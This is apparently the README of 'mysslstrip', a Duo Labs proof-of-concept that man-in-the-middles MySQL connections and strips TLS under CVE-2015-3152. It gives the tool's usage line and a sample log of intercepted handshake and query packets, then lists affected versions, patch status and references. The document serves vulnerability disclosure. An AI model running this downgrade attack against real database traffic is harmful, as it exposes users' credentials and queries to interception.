# mysslstrip

mysslstrip is a Python-based proof of concept showing how to MITM
MySQL traffic and strip SSL/TLS, as per [CVE-2015-3152](http://www.openwall.com/lists/oss-security/2015/04/29/4).

## Usage

`mysslstrip.py [-h] [-p LISTEN_PORT] [-i LISTEN_INTERFACE] dest`

## Example Output

```
[root@duo1 ~]# python2.7 mysslstrip.py -p 3307 127.0.0.1:3306
2015-04-29 21:33:14+0000 [-] Log opened.
2015-04-29 21:33:14+0000 [-] listen: 127.0.0.1:3307; connect: 127.0.0.1:3306
2015-04-29 21:33:14+0000 [-] MySQLForwardServerFactory starting on 3307
2015-04-29 21:33:14+0000 [-] Starting factory <__main__.MySQLForwardServerFactory instance at 0x7f7769912fc8>
2015-04-29 21:33:21+0000 [__main__.MySQLForwardServerFactory] Starting factory <twisted.internet.endpoints.OneShotFactory instance at 0x7f776787c248>
2015-04-29 21:33:21+0000 [MySQLForwardClientProtocol,client] <class '__main__.MySQLForwardClientProtocol'> received: 'J\x00\x00\x00\n5.6.21\x00\x04\x00\x00\x00"l{I8{%D\x00\xff\xff\x08\x02\x00\x7f\xc0\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00fSPsur[Rg/S6\x00mysql_native_password\x00'
2015-04-29 21:33:21+0000 [MySQLForwardServerProtocol,0,127.0.0.1] <class '__main__.MySQLForwardServerProtocol'> received: '\xb6\x00\x00\x01\x85\xa6\x7f@\x00\x00\x00\x01!\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00root\x00\x14U\xe7\x0b\x0cs\xb5\xf3\x00\x07&=\xa8\xa6\xf9I\xf0\x86}G\xffmysql_native_password\x00e\x03_os\x05Linux\x0c_client_name\x08libmysql\x04_pid\x042361\x0f_client_version\x065.6.21\t_platform\x06x86_64\x0cprogram_name\x05mysql'
2015-04-29 21:33:21+0000 [MySQLForwardClientProtocol,client] <class '__main__.MySQLForwardClientProtocol'> received: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
2015-04-29 21:33:21+0000 [MySQLForwardServerProtocol,0,127.0.0.1] <class '__main__.MySQLForwardServerProtocol'> received: '!\x00\x00\x00\x03select @@version_comment limit 1'
2015-04-29 21:33:21+0000 [MySQLForwardClientProtocol,client] <class '__main__.MySQLForwardClientProtocol'> received: "\x01\x00\x00\x01\x01'\x00\x00\x02\x03def\x00\x00\x00\x11@@version_comment\x00\x0c!\x00x\x00\x00\x00\xfd\x00\x00\x1f\x00\x00\x05\x00\x00\x03\xfe\x00\x00\x02\x00)\x00\x00\x04(Distributed by The IUS Community Project\x05\x00\x00\x05\xfe\x00\x00\x02\x00"
2015-04-29 21:33:27+0000 [MySQLForwardServerProtocol,0,127.0.0.1] <class '__main__.MySQLForwardServerProtocol'> received: '\x16\x00\x00\x00\x03SELECT "HELLO, WORLD"'
2015-04-29 21:33:27+0000 [MySQLForwardClientProtocol,client] <class '__main__.MySQLForwardClientProtocol'> received: '\x01\x00\x00\x01\x01"\x00\x00\x02\x03def\x00\x00\x00\x0cHELLO, WORLD\x00\x0c!\x00$\x00\x00\x00\xfd\x01\x00\x1f\x00\x00\x05\x00\x00\x03\xfe\x00\x00\x02\x00\r\x00\x00\x04\x0cHELLO, WORLD\x05\x00\x00\x05\xfe\x00\x00\x02\x00'
2015-04-29 21:33:33+0000 [MySQLForwardServerProtocol,0,127.0.0.1] <class '__main__.MySQLForwardServerProtocol'> received: '\x01\x00\x00\x00\x01'
```

## Additional Information


**Is this a real vulnerability?**

Yes! Encrypt all the things. Allowing opportunistic degradation of encryption is pretty poor practice.

The vulnerability affects MySQL 5.7.2 and earlier versions, along with MySQL Connector versions 6.1.2 and earlier, all versions of Percona Server and all versions of MariaDB.

**Patch?**

It's been fixed in [MySQL 5.7.3](http://dev.mysql.com/doc/relnotes/mysql/5.7/en/news-5-7-3.html) ... but the security
patch hasn't been backported to any other version, so if you're on 5.6 like [99.99%](https://scans.io/data/umich/dadrian/backronym/banners.mysql.20150429.json) of the Internet is, you're out of
luck unless you switch to the 5.7 "preview release".

Created by [Adam Goodman](https://twitter.com/akgood) of [Duo Labs](https://labs.duosecurity.com).

**Inquiries?**

PR Inquiries: [this.is.a.really.big.deal@duosecurity.com](mailto:this.is.a.really.big.deal@duosecurity.com)  
Technical Inquiries: [this.isnt.a.big.deal.but.you.should.still.patch@duosecurity.com](mailto:this.isnt.a.big.deal.but.you.should.still.patch@duosecurity.com)  
Twitters: [@duo\_labs](https://twitter.com/duo_labs)

### References

[http://backronym.fail](http://backronym.fail)  
[https://www.duosecurity.com/blog/backronym-mysql-vulnerability](https://www.duosecurity.com/blog/backronym-mysql-vulnerability)  
[http://www.openwall.com/lists/oss-security/2015/04/29/4](http://www.openwall.com/lists/oss-security/2015/04/29/4)  
[http://www.ocert.org/advisories/ocert-2015-003.html](http://www.ocert.org/advisories/ocert-2015-003.html)  
[https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-3152](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-3152)
